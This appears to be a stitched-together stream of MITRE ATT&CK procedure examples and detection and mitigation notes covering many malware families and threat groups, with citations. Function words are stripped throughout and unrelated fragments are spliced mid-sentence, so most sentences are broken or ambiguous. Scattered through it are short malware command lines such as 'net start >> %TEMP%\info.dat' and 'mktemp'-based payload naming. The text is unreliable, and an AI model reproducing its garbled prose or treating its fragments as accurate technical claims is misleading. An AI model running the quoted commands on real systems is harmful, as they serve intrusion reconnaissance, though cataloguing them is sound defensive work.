CVE-2020-0674.(Citation: ATT Sidewinder January 2021)(Citation: Cyble Sidewinder September 2020) [Shark](https://attack.mitre.org/software/S1019) ability upload files compromised host DNS C2 channel.(Citation: ClearSky Siamesekitten August 2021) [Volgmer](https://attack.mitre.org/software/S0180) list directories victim.(Citation: US-CERT Volgmer Nov 2017) [Ursnif](https://attack.mitre.org/software/S0386) Registry establish automatic execution startup.(Citation: TrendMicro PE_URSNIF.A2)(Citation: TrendMicro BKDR_URSNIF.SM) [Conti](https://attack.mitre.org/software/S0575) enumerate remote SMB network shares <code>NetShareEnum()</code>.(Citation: CarbonBlack Conti July 2020)(Citation: CrowdStrike Wizard Spider October 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) RDP direct remote point-and-click access.(Citation: Netscout Stolen Pencil Dec 2018) [Squirrelwaffle](https://attack.mitre.org/software/S1030) malicious VBA macros Word documents Excel spreadsheets execute `AutoOpen` subroutine.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021)  [Hikit](https://attack.mitre.org/software/S0009) spread spear phishing.(Citation: Novetta-Axiom) (Citation: SecureList Griffon 2019)(Citation: CrowdStrike Carbon Spider August 2021)(Citation: FBI Flash FIN7 USB) [Gelsemium](https://attack.mitre.org/software/S0666) dynamic DNS domain names C2.(Citation: ESET Gelsemium June 2021) Integrity Protection (SIP) enabled macOS, aforementioned environment variables executing protected binaries. Third-party applications leverage Apple’s Hardened Runtime, ensuring environment variables subject imposed restrictions.(Citation: Apple Developer Doco Hardened Runtime) Admins add restrictions applications setting setuid setgid bits, entitlements, __RESTRICT segment Mach-O binary. [Torisma](https://attack.mitre.org/software/S0678) Windows API calls.(Citation: McAfee Lazarus Nov 2020) [Koadic](https://attack.mitre.org/software/S0250) performs operations Windows Script Host (VBScript) runs arbitrary shellcode .(Citation: Github Koadic) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) adds Registry achieve persistence.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021) [Transparent Tribe](https://attack.mitre.org/groups/G0134) set websites malicious hyperlinks iframes infect targeted victims [Crimson](https://attack.mitre.org/software/S0115), [njRAT](https://attack.mitre.org/software/S0385), malicious tools.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Unit 42 ProjectM March 2016)(Citation: Talos Transparent Tribe 2021) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `fsutil fsinfo drives` command advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [Higaisa](https://attack.mitre.org/groups/G0126) VBScript code victim's machine.(Citation: PTSecurity Higaisa 2020) [ShadowPad](https://attack.mitre.org/software/S0596) collected current time victim system.(Citation: Kaspersky ShadowPad Aug 2017) [DropBook](https://attack.mitre.org/software/S0547) Python-based backdoor compiled PyInstaller.(Citation: Cybereason Molerats Dec 2020) [PowerSploit](https://attack.mitre.org/software/S0194) collection Privesc-PowerUp modules discover exploit path interception opportunities PATH environment variable.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Emotet](https://attack.mitre.org/software/S0367) observed encrypting data collects sending C2 server. (Citation: Fortinet Emotet 2017) [SUNBURST](https://attack.mitre.org/software/S0559) WMI query <code>Select * Win32_SystemDriver</code> retrieve driver listing.(Citation: FireEye SUNBURST Backdoor December 2020) [APT39](https://attack.mitre.org/groups/G0087) malware decrypt encrypted CAB files.(Citation: FBI FLASH APT39 September 2020) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) uploader malware uploader <code>command</code> delete RAR archives exfiltrated.(Citation: Secureworks BRONZE BUTLER Oct 2017) [Drovorub](https://attack.mitre.org/software/S0502) transfer files victim machine.(Citation: NSA/FBI Drovorub August 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) performed screen captures victims, including tool, scr.exe (which matched hash ScreenUtil).(Citation: US-CERT TA18-074A)(Citation: Symantec Dragonfly Sept 2017)(Citation: Gigamon Berserk Bear October 2021) [MacSpy](https://attack.mitre.org/software/S0282) deletes temporary files creates(Citation: alientvault macspy) Disable WinRM service. [LookBack](https://attack.mitre.org/software/S0582) kill processes delete services.(Citation: Proofpoint LookBack Malware Aug 2019) [WINDSHIELD](https://attack.mitre.org/software/S0155) C2 traffic communicate TCP raw sockets.(Citation: FireEye APT32 2017) [KOCTOPUS](https://attack.mitre.org/software/S0669) relied victims clicking malicious document execution.(Citation: MalwareBytes LazyScripter Feb 2021)  [TeamTNT](https://attack.mitre.org/groups/G0139) modified permissions binaries <code>chattr</code>.(Citation: Trend Micro TeamTNT)(Citation: Cisco Talos Intelligence Group) [DanBot](https://attack.mitre.org/software/S1014) scheduled task installation.(Citation: SecureWorks August 2019) [Taidoor](https://attack.mitre.org/software/S0011) <code>GetLocalTime</code> <code>GetSystemTime</code> collect time.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Lizar](https://attack.mitre.org/software/S0681) command command-line infected system.(Citation: Threatpost Lizar 2021)(Citation: BiZone Lizar 2021)  (Citation: FireEye APT30) [HiddenWasp](https://attack.mitre.org/software/S0394) creates user account provide initial persistence compromised machine.(Citation: Intezer HiddenWasp Map 2019) Enable application control solutions AppLocker Device Guard block loading malicious SIP DLLs. install browser extensions trusted sources verified. Browser extensions browsers controlled Policy. Change settings prevent browser installing extensions sufficient permissions. [OSX/Shlayer](https://attack.mitre.org/software/S0402) <code>mktemp</code> utility random unique filenames payloads, <code>export tmpDir="$(mktemp -d /tmp/XXXXXXXXXXXX)"</code> <code>mktemp -t Installer</code>.(Citation: sentinelone shlayer zshlayer)(Citation: 20 macOS Common Tools Techniques)(Citation: Shlayer jamf gatekeeper bypass 2021) [Kerrdown](https://attack.mitre.org/software/S0585) VBS base64 decoder function published Motobit.(Citation: Unit 42 KerrDown February 2019) software store credentials Registry, ensure accounts limited permissions abused adversary. [FIN7](https://attack.mitre.org/groups/G0046) harvested valid administrative credentials lateral movement.(Citation: CrowdStrike Carbon Spider August 2021) Regsvcs Regasm environment. [SDBbot](https://attack.mitre.org/software/S0461) ability clean remove data structures compromised host.(Citation: Proofpoint TA505 October 2019) Policy configure block modifications W32Time parameters Registry. (Citation: W32Time 2017) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  (Citation: Symantec Waterbug Jun 2019) [APT28](https://attack.mitre.org/groups/G0007) saved files hidden file attributes.(Citation: Talos Seduploader Oct 2017)(Citation: Talos Seduploader Oct 2017) Monitor newly constructed files abuse Office templates persistence compromised system. variants [FakeM](https://attack.mitre.org/software/S0076) SSL communicate C2 servers.(Citation: Scarlet Mimic Jan 2016) shortcut's target path change, modifications shortcut files correlate software changes, patches, removal, etc., suspicious. Analysis attempt relate shortcut file change events suspicious events based adversary behavior process launches unknown executables network connections. [Proton](https://attack.mitre.org/software/S0279) prompts users credentials.(Citation: objsee mac malware 2017) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) [Systeminfo](https://attack.mitre.org/software/S0096) gather victim.(Citation: ESET Sednit 2)(Citation: Bitdefender APT28 Dec 2015) (Citation: Cybereason Soft Cell June 2019) [Windshift](https://attack.mitre.org/groups/G0112) malware enumerate active processes.(Citation: BlackBerry Bahamut) [SodaMaster](https://attack.mitre.org/software/S0627) <code>RegOpenKeyW</code> access Registry.(Citation: Securelist APT10 March 2021) [Helminth](https://attack.mitre.org/software/S0170) scheduled task persistence.(Citation: ClearSky OilRig Jan 2017) filtering network traffic untrusted bad domains resources.  [BoxCaon](https://attack.mitre.org/software/S0651) DropBox C2 communications.(Citation: Checkpoint IndigoZebra July 2021)  [PoshC2](https://attack.mitre.org/software/S0378) enumerate network adapter information.(Citation: GitHub PoshC2) [Saint Bot](https://attack.mitre.org/software/S1018) injected DLL component `EhStorAurhn.exe`.(Citation: Malwarebytes Saint Bot April 2021) [Confucius](https://attack.mitre.org/groups/G0142) malicious links victims email campaigns.(Citation: TrendMicro Confucius APT Aug 2021) [SHIPSHAPE](https://attack.mitre.org/software/S0028) achieves persistence creating shortcut Startup folder.(Citation: FireEye APT30) Monitor processes start login unusual unknown applications. Usual applications login items include users add configure user environment, email, chat, music applications, administrators include organization settings protections. Check running applications login items abnormal behavior, establishing network connections. [RTM](https://attack.mitre.org/groups/G0048) Registry establish persistence [RTM](https://attack.mitre.org/software/S0148) Trojan tools, modified version TeamViewer remote desktop software.(Citation: ESET RTM Feb 2017)(Citation: IB RTM August 2019) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) ability list files file characteristics including extension, size, ownership, permissions.(Citation: ANSSI Sandworm January 2021) [JPIN](https://attack.mitre.org/software/S0201) command-line utility cacls.exe change file permissions.(Citation: PLATINUM April 2016) [Threat Group-3390](https://attack.mitre.org/groups/G0027) CVE-2014-6324 CVE-2017-0213 escalate privileges.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Profero APT27 December 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) start VNC-based remote desktop server tunnel connection established C2 channel.(Citation: cobaltstrike manual)(Citation: Cybereason Bumblebee August 2022) file collection tool [RainyDay](https://attack.mitre.org/software/S0629) utilize native API including <code>ReadDirectoryChangeW</code> folder monitoring.(Citation: Bitdefender Naikon April 2021) [Kimsuky](https://attack.mitre.org/groups/G0094) created email accounts phishing operations.(Citation: KISA Operation Muzabi) [Emotet](https://attack.mitre.org/software/S0367) RSA encrypting C2 traffic. (Citation: Trend Micro Emotet Jan 2019) [Cobalt Strike](https://attack.mitre.org/software/S0154)'s Beacon payload capable running commands <code>cmd.exe</code> PowerShell commands <code>powershell.exe</code>(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [Empire](https://attack.mitre.org/software/S0363) leverages PowerShell majority client-side agent tasks. [Empire](https://attack.mitre.org/software/S0363) ability conduct PowerShell remoting <code>Invoke-PSRemoting</code> module.(Citation: Github PowerShell Empire)(Citation: NCSC Joint Report Public Tools) [PcShare](https://attack.mitre.org/software/S1050) named `wuauclt.exe` legitimate Windows Update AutoUpdate Client.(Citation: Bitdefender FunnyDream Campaign November 2020) tools restrict program execution application control attributes file common operating utilities needed. [More_eggs](https://attack.mitre.org/software/S0284) decode malware components dropped system.(Citation: Security Intelligence Eggs Aug 2019) [Tonto Team](https://attack.mitre.org/groups/G0131) tools [NBTscan](https://attack.mitre.org/software/S0590) enumerate network shares.(Citation: TrendMicro Tonto Team October 2020) [Gamaredon Group](https://attack.mitre.org/groups/G0047) left taunting images messages victims' desktops proof access.(Citation: CERT-EE Gamaredon January 2021) [UNC2452](https://attack.mitre.org/groups/G0118) 7-Zip decode [Raindrop](https://attack.mitre.org/software/S0565) malware.(Citation: Symantec RAINDROP January 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) persistence mechanisms <code>forfiles.exe</code> execute .htm files.(Citation: Qualys LolZarus) Command arguments invocation odbcconf.exe determining origin purpose DLL loaded. [Goopy](https://attack.mitre.org/software/S0477) ability Outlook backdoor macro communicate C2.(Citation: Cybereason Cobalt Kitty 2017)	 Monitor third-party application logging, messaging, artifacts target network services systems conduct DoS. addition network level detections, endpoint logging instrumentation detection. Attacks targeting applications generate logs server, application server, database server identify type attack, impact felt. Externally monitor availability services targeted Endpoint DoS. auditing tools capable detecting file permissions abuse opportunities systems enterprise correct them. Toolkits PowerSploit framework PowerUp modules explore systems service file permissions weaknesses.(Citation: Powersploit) [Pupy](https://attack.mitre.org/software/S0192) drop mouse-logger screenshots send server.(Citation: GitHub Pupy) [Pillowmint](https://attack.mitre.org/software/S0517) malicious shim database maintain persistence.(Citation: Trustwave Pillowmint June 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) deleted dropper files infected command scripts.(Citation: TrendMicro Tropic Trooper 2020)	 [REvil](https://attack.mitre.org/software/S0496) force reboot safe mode networking.(Citation: BleepingComputer REvil 2021) [Cryptoistic](https://attack.mitre.org/software/S0498) retrieve files local file system.(Citation: SentinelOne Lazarus macOS July 2020) [Okrum](https://attack.mitre.org/software/S0439) establish persistence creating .lnk shortcut Startup folder.(Citation: ESET Okrum July 2019) [Aria-body](https://attack.mitre.org/software/S0456) TCP C2 communications.(Citation: CheckPoint Naikon 2020) [CrackMapExec](https://attack.mitre.org/software/S0488) dump usernames hashed passwords SAM.(Citation: CME Github September 2018) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor unusual processes accessing local email files target user email local systems collect sensitive information. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors domain accounts gain access victim systems.(Citation: McAfee Night Dragon) [Pupy](https://attack.mitre.org/software/S0192) Lazagne harvesting credentials.(Citation: GitHub Pupy) [Sykipot](https://attack.mitre.org/software/S0018) <code>net start</code> display running services.(Citation: AlienVault Sykipot 2011) (Citation: TrendMicro EarthLusca 2022) [TURNEDUP](https://attack.mitre.org/software/S0199) capable screenshots.(Citation: FireEye APT33 Sept 2017) [Emotet](https://attack.mitre.org/software/S0367) observed leveraging module retrieves passwords stored current logged-on user. (Citation: US-CERT Emotet Jul 2018)(Citation: CIS Emotet Dec 2018) [APT37](https://attack.mitre.org/groups/G0067) Bluetooth device harvester, Windows Bluetooth APIs connected Bluetooth devices. (Citation: Securelist ScarCruft 2019) (Citation: McAfee GhostSecret) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors [gsecdump](https://attack.mitre.org/software/S0008) dump account hashes.(Citation: McAfee Night Dragon) [Gelsemium](https://attack.mitre.org/software/S0666) decompress decrypt DLLs shellcode.(Citation: ESET Gelsemium June 2021) [Earth Lusca](https://attack.mitre.org/groups/G1006) steganography hide shellcode BMP image file.(Citation: TrendMicro EarthLusca 2022) [SUNSPOT](https://attack.mitre.org/software/S0562) monitored running processes instances <code>MsBuild.exe</code> hashing running process comparing <code>0x53D525</code>. extracted command-line arguments individual arguments running <code>MsBuild.exe</code> process identify directory path Orion software Visual Studio solution.(Citation: CrowdStrike SUNSPOT Implant January 2021) [Peirates](https://attack.mitre.org/software/S0683) enumerate Kubernetes pods namespace.(Citation: Peirates GitHub) Enable security auditing collect logs hybrid identity solutions. example, monitor sign-ins Azure Application Proxy Connector, typically generated Pass Authentication (PTA) Agent added. (Citation: Mandiant Azure Backdoors) FS use, review logs event 501, specifies EKU attributes claim, raise alerts values configured environment.(Citation: MagicWeb) [BabyShark](https://attack.mitre.org/software/S0414) executed <code>whoami</code> command.(Citation: Unit42 BabyShark Feb 2019) Monitor newly constructed processes command-lines actions gather network information. network discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities, Lateral Movement, based obtained. [AppleJeus](https://attack.mitre.org/software/S0584) deleted MSI file installation.(Citation: CISA AppleJeus Feb 2021) [PoetRAT](https://attack.mitre.org/software/S0428) FTP C2 communications.(Citation: Talos PoetRAT October 2020) Monitor files modified unusual accounts normal administration duties. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [FunnyDream](https://attack.mitre.org/software/S1044) established persistence running `sc.exe` setting `WSearch` service automatically.(Citation: Bitdefender FunnyDream Campaign November 2020) (Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [QuasarRAT](https://attack.mitre.org/software/S0262) module performing remote desktop access.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) Windows 10, enable Attack Surface Reduction (ASR) rules prevent application writing signed vulnerable driver system.(Citation: Malicious Driver Reporting Center) Windows 11, enable Vulnerable Driver Blocklist assist hardening party-developed service drivers.(Citation: driver block rules)   [Bazar](https://attack.mitre.org/software/S0534) enumerate victim's desktop.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Peppy](https://attack.mitre.org/software/S0643) log keystrokes compromised hosts.(Citation: Proofpoint Operation Transparent Tribe March 2016) [ZxxZ](https://attack.mitre.org/software/S1013) API functions `Process32First`, `Process32Next`, `ShellExecuteA`.(Citation: Cisco Talos Bitter Bangladesh 2022) (Citation: NCC Chimera January 2021) [RCSession](https://attack.mitre.org/software/S0662) encrypted beacon check C2.(Citation: Secureworks BRONZE PRESIDENT December 2019) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors uploaded commonly hacker tools compromised servers.(Citation: McAfee Night Dragon) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) execute <code>FileRecvWriteRand</code> append random bytes file received C2.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) malware Registry establish persistence.(Citation: Unit 42 Magic Hound Feb 2017) [xCaon](https://attack.mitre.org/software/S0653) uploaded files victims' machines.(Citation: Checkpoint IndigoZebra July 2021) Audit Remote Desktop Users membership regularly. Remove unnecessary accounts Remote Desktop Users [FunnyDream](https://attack.mitre.org/software/S1044) Registry Key Startup folder establish persistence.(Citation: Bitdefender FunnyDream Campaign November 2020) Monitor newly executed processes establish persistence executing malicious content triggered hijacked references Component Object Model (COM) objects. [Winnti Windows](https://attack.mitre.org/software/S0141) sets DLL file service Registry establish persistence.(Citation: Winnti Jan 2017) [xCaon](https://attack.mitre.org/software/S0653) communicated C2 server sending POST requests HTTP.(Citation: Checkpoint IndigoZebra July 2021)  (Citation: FireEye admin@338) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors `wmic` `rundll32` load [Cobalt Strike](https://attack.mitre.org/software/S0154) target host.(Citation: DFIR Conti Bazar Nov 2021) [SpeakUp](https://attack.mitre.org/software/S0374) <code>cat /proc/cpuinfo | grep -c “cpu family” 2>&1</code> command gather information. (Citation: CheckPoint SpeakUp Feb 2019) [Cuba](https://attack.mitre.org/software/S0625) modify services <code>OpenService</code> <code>ChangeServiceConfig</code> functions.(Citation: McAfee Cuba April 2021)  [macOS.OSAMiner](https://attack.mitre.org/software/S1048) `curl` download [Stripped Payloads](https://attack.mitre.org/techniques/T1027/008) public facing adversary-controlled webpage.  [Lazarus Group](https://attack.mitre.org/groups/G0032) malware SierraBravo-Two generates email message SMTP newly infected victims.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) [Rancor](https://attack.mitre.org/groups/G0075) C2.(Citation: Rancor Unit42 June 2018) [APT29](https://attack.mitre.org/groups/G0016) compromised local accounts access victims' networks.(Citation: CrowdStrike StellarParticle January 2022) [Diavol](https://attack.mitre.org/software/S0659) attempt security software.(Citation: Fortinet Diavol July 2021) [Kivars](https://attack.mitre.org/software/S0437) ability uninstall malware infected host.(Citation: TrendMicro BlackTech June 2017) [APT29](https://attack.mitre.org/groups/G0016) registered devices enable mailbox syncing <code>Set-CASMailbox</code> command.(Citation: Volexity SolarWinds) (Citation: Cisco Talos Bitter Bangladesh 2022) Monitor API calls concealing Registry keys, Reghide. (Citation: Reghide NOV 2006) Inspect cleanup malicious hidden Registry entries Native Windows API calls tools Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) RegDelNull (Citation: RegDelNull July 2016).  [KeyBoy](https://attack.mitre.org/software/S0387) determine public WAN IP address system.(Citation: PWC KeyBoys Feb 2017) [InvisiMole](https://attack.mitre.org/software/S0260) rundll32.exe execution.(Citation: ESET InvisiMole June 2020) [QuietSieve](https://attack.mitre.org/software/S0686) ability execute payloads hidden window.(Citation: Actinium February 2022) Monitor execution commands utilities abused forge steal certificates private keys.(Citation: SpecterOps Certified Pre Owned) [ROKRAT](https://attack.mitre.org/software/S0240) modify `HKEY_CURRENT_USER\Software\Microsoft\Office\` registry key bypass VB object model (VBOM) compromised host.(Citation: Malwarebytes RokRAT VBA January 2021) [SoreFang](https://attack.mitre.org/software/S0516) download additional payloads C2.(Citation: CISA SoreFang July 2016)(Citation: NCSC APT29 July 2020) [TA551](https://attack.mitre.org/groups/G0127) regsvr32.exe load malicious DLLs.(Citation: Unit 42 Valak July 2020) [SideTwist](https://attack.mitre.org/software/S0610) <code>GetUserNameW</code>, <code>GetComputerNameW</code>, <code>GetComputerNameExW</code> gather information.(Citation: Check APT34 April 2021) (Citation: Kaspersky Lyceum October 2021)(Citation: Accenture Lyceum Targets November 2021) [FinFisher](https://attack.mitre.org/software/S0182) token manipulation NtFilterToken UAC bypass.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [WellMess](https://attack.mitre.org/software/S0514) collect username victim machine send C2.(Citation: CISA WellMess July 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware unique form communication encryption FakeTLS mimics TLS encryption method, evading SSL traffic inspection/decryption.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee GhostSecret) [ComRAT](https://attack.mitre.org/software/S0126) email attachments command control.(Citation: ESET ComRAT 2020) [PingPull](https://attack.mitre.org/software/S1031) HTTPS port 8080 C2.(Citation: Unit 42 PingPull Jun 2022) [ROADTools](https://attack.mitre.org/software/S0684) enumerate Azure systems devices.(Citation: Roadtools) Monitor user accounts logged systems [Valid Accounts](https://attack.mitre.org/techniques/T1078) log remote machines Secure (SSH). example, Linux systems SSH logon activity logs located <code>/var/log/auth.log</code> <code>/var/log/secure</code> depending distro using. [LAPSUS$](https://attack.mitre.org/groups/G1004) uploaded sensitive files, information, credentials targeted organization extortion public release.(Citation: MSTIC DEV-0537 Mar 2022) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors split RAR files exfiltration parts.(Citation: Dell TG-3390) [CARROTBAT](https://attack.mitre.org/software/S0462) ability determine operating compromised host Windows x86 x64 architecture.(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020) [DarkVishnya](https://attack.mitre.org/groups/G0105) tools [Impacket](https://attack.mitre.org/software/S0357), [Winexe](https://attack.mitre.org/software/S0191), [PsExec](https://attack.mitre.org/software/S0029).(Citation: Securelist DarkVishnya Dec 2018) [WarzoneRAT](https://attack.mitre.org/software/S0670) capability install live offline keylogger, including `GetAsyncKeyState` Windows API.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020)  services aid tracking newly issued certificates certificates sites Internet. pivot pieces certificate uncover adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) server-side components adversary tools default values set SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Defense Evasion Command Control. [P.A.S. Webshell](https://attack.mitre.org/software/S0598) gain remote access execution target servers.(Citation: ANSSI Sandworm January 2021) [BoxCaon](https://attack.mitre.org/software/S0651) execute arbitrary commands utilize "ComSpec" environment variable.(Citation: Checkpoint IndigoZebra July 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) payload removes running. [TeamTNT](https://attack.mitre.org/groups/G0139) deleted locally staged files collecting credentials scan local IP addresses exfiltrating them.(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Cisco Talos Intelligence Group) [Briba](https://attack.mitre.org/software/S0204) installs service malicious DLL dropped disk.(Citation: Symantec Briba 2012) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) python scripts.(Citation: Morphisec ShellTea June 2019) [Turla](https://attack.mitre.org/groups/G0010) customized publicly-available tools [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Symantec Waterbug Jun 2019) [Okrum](https://attack.mitre.org/software/S0439) RAR archiver tool compress/decompress data.(Citation: ESET Okrum July 2019) Monitor files hidden users mask presence user accounts create modify. Monitor <code>/Library/Preferences/com.apple.loginwindow</code> plist file unexpected modifications <code> Hide500Users</code> key macOS.(Citation: Cybereason OSX Pirrit) [APT29](https://attack.mitre.org/groups/G0016) named tasks <code>\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager</code> legitimate.(Citation: Volexity SolarWinds) [Torisma](https://attack.mitre.org/software/S0678) `GetlogicalDrives` bitmask drives compromised system. `GetDriveType` determine drive CD-ROM drive.(Citation: McAfee Lazarus Nov 2020) Regularly check component software critical services adversaries target persistence verify integrity systems identify unexpected made. [SideTwist](https://attack.mitre.org/software/S0610) Base64 encoded C2 traffic.(Citation: Check APT34 April 2021) Limit permissions creating, deleting, altering compute components privilege. Organizations limit users organization IAM role administrative privileges, strive reduce permanent privileged role assignments, conduct periodic entitlement reviews IAM users, roles policies.(Citation: Mandiant M-Trends 2020) [Zeus Panda](https://attack.mitre.org/software/S0330) PowerShell download execute payload.(Citation: Talos Zeus Panda Nov 2017) [Ebury](https://attack.mitre.org/software/S0377) deactivate PAM modules tamper sshd configuration.(Citation: ESET Ebury Oct 2017) (Citation: PLATINUM April 2016) [HAFNIUM](https://attack.mitre.org/groups/G0125) 7-Zip WinRAR compress stolen files exfiltration.(Citation: HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021) [Duqu](https://attack.mitre.org/software/S0038) track key presses keylogger module.(Citation: Symantec W32.Duqu) Monitor files update patch attempt manipulate features artifacts legitimate benign users security tools. [Bad Rabbit](https://attack.mitre.org/software/S0606)’s <code>infpub.dat</code> file NTLM login credentials brute force Windows machines.(Citation: Secure List Bad Rabbit) [Clambling](https://attack.mitre.org/software/S0660) ability TCP UDP communication.(Citation: Trend Micro DRBControl February 2020) [jRAT](https://attack.mitre.org/software/S0283) capability log keystrokes victim’s machine, offline online.(Citation: jRAT Symantec Aug 2018)(Citation: Kaspersky Adwind Feb 2016) [KONNI](https://attack.mitre.org/software/S0356) relied victim enable malicious macros attachment delivered email.(Citation: Malwarebytes Konni Aug 2021) [GoldMax](https://attack.mitre.org/software/S0588) packed obfuscation.(Citation: FireEye SUNSHUTTLE Mar 2021) Anti-virus automatically quarantine suspicious files. [Skidmap](https://attack.mitre.org/software/S0468) kernel-mode rootkit cryptocurrency mining.(Citation: Trend Micro Skidmap) [Maze](https://attack.mitre.org/software/S0449) inserted blocks junk code, including components decrypt strings encryption process.(Citation: McAfee Maze March 2020) [USBferry](https://attack.mitre.org/software/S0452) <code>net user</code> gather local accounts.(Citation: TrendMicro Tropic Trooper 2020)	 [BlackTech](https://attack.mitre.org/groups/G0098) SNScan tool potential targets victim networks.(Citation: Symantec Palmerworm Sep 2020) [KeyBoy](https://attack.mitre.org/software/S0387) gather extended information, operating system, disks, memory.(Citation: PWC KeyBoys Feb 2017)(Citation: Rapid7 KeyBoy Jun 2013) [POWRUNER](https://attack.mitre.org/software/S0184) collect network configuration data running <code>ipconfig /all</code> victim.(Citation: FireEye APT34 Dec 2017) [Trojan.Karagany](https://attack.mitre.org/software/S0094) desktop screenshot save file <code>\ProgramData\Mail\MailAg\shot.png</code>.(Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019) [ZxxZ](https://attack.mitre.org/software/S1013) download execute additional files.(Citation: Cisco Talos Bitter Bangladesh 2022) [Grandoreiro](https://attack.mitre.org/software/S0531) malicious links gain execution victim machines.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) spearphishing emails contained malicious Office fake installer file attachments.(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro TropicTrooper 2015)(Citation: CitizenLab Tropic Trooper Aug 2018)(Citation: Anomali Pirate Panda April 2020)(Citation: TrendMicro Tropic Trooper 2020) [MacMa](https://attack.mitre.org/software/S1016) collect username compromised machine.(Citation: ESET DazzleSpy Jan 2022) Limit privileges user accounts authorized administrators perform Winlogon helper changes. [OilRig](https://attack.mitre.org/groups/G0049) <code>hostname</code> <code>systeminfo</code> victim.(Citation: Palo Alto OilRig 2016)(Citation: Palo Alto OilRig Oct 2016)(Citation: FireEye APT34 July 2019)(Citation: Check APT34 April 2021)	 [BlackEnergy](https://attack.mitre.org/software/S0089) 2 plug-in WMI gather victim host details.(Citation: Securelist BlackEnergy Feb 2015) Apply patch KB2871997 Windows 7 systems limit default access accounts local administrator group.(Citation: NSA Spotting)  version [XTunnel](https://attack.mitre.org/software/S0117) introduced July 2015 inserted junk code binary attempt obfuscate bypass security products.(Citation: ESET Sednit 2) [DCSrv](https://attack.mitre.org/software/S1033) created services persistence modifying Registry.(Citation: Checkpoint MosesStaff Nov 2021) [FinFisher](https://attack.mitre.org/software/S0182) takes screenshot screen displays windows apparent attempt hide messages setup process.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [QUADAGENT](https://attack.mitre.org/software/S0269) HTTPS C2 communications.(Citation: Unit 42 QUADAGENT July 2018) [Metamorfo](https://attack.mitre.org/software/S0455) command launch keylogger capture keystrokes victim’s machine.(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019)  [Comnie](https://attack.mitre.org/software/S0244) runs command: <code>net start >> %TEMP%\info.dat</code> victim.(Citation: Palo Alto Comnie) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Malware researchers reverse engineer malware variants dynamic resolution determine future C2 infrastructure malware attempt contact, time resource intensive effort.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA Brute Force) Monitor creation access tokens SAML tokens 4769 1200 events domain.(Citation: Sygnia Golden SAML) [Windshift](https://attack.mitre.org/groups/G0112) compromised websites register custom URL schemes remote system.(Citation: objective-see windtail1 dec 2018) [Axiom](https://attack.mitre.org/groups/G0001) steganography hide C2 communications.(Citation: Novetta-Axiom) [BLUELIGHT](https://attack.mitre.org/software/S0657) encoded data binary blob XOR.(Citation: Volexity InkySquid BLUELIGHT August 2021) [EvilBunny](https://attack.mitre.org/software/S0396) API calls NtQuerySystemTime, GetSystemTimeAsFileTime, GetTickCount gather time metrics checks malware running 